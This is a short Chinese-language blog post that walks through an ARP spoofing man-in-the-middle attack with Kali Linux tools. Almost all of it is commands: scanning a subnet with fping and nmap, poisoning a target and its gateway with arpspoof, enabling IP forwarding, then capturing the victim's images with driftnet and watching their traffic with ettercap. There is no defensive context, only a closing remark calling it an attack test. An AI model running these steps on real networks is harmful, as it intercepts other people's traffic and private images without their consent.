---
title: 使用Kali进行ARP欺骗攻击
date: 2023-05-22 10:28:36
author: xeonds
toc: true
excerpt: (￣﹃￣)
---

## 步骤

先用`ifconfig`看网卡名称，我是`eth0`。随后用`fping`或者`nmap`扫描网段

```bash
fping -asg 192.168.16.0/24
# 或者这条
nmap 192.168.16.1-100
arpspoof -i eth0 -t [target IP] [gate]
```

如果想做中间人攻击，编辑`/etc/sysctl.conf`，添加配置`net.ipv4.ip_forward=1`，就可以开启端口转发。

此时重新运行，不过得换一下网关ip和目标ip

```bash
arpspoof -i eth0 -t [gate] [target IP] 
```
随后打开另一个终端，运行`driftnet`和`ettercap`：

```bash
driftnet -i eth0 -a -d /root/out
ettercap -Tq -i eth0
```

在上面的目录可以看到缓存的图片，下面的终端可以看到eth0的流量。至此，攻击测试完成。

